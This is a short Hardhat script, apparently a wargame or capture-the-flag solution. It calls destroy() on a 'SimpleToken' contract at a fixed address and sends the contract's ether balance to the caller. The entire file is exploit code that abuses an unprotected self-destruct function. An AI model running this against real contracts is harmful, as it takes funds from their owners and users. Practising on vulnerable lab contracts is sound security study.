import { ethers } from "hardhat";

const targetContractAddress = "0x372d8fe053Ce86E93e5A684D3C5fA27F055AadF9";
const targetTokenContractAddress = "0xc41c85522a593530af41df2d0cd5266f46cf7949";

const main = async () => {
  const signer = (await ethers.getSigners())[0];
  const signerAddress = await signer.getAddress();
  console.log(`Signer Address: ${signerAddress}`);

  const simpleToken = await ethers.getContractAt("SimpleToken", targetTokenContractAddress);

  console.log(`Balance: ${await ethers.provider.getBalance(targetTokenContractAddress)}`);

  const tx = await simpleToken.destroy(signerAddress);
  await tx.wait();

  console.log(`Balance: ${await ethers.provider.getBalance(targetTokenContractAddress)}`);
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
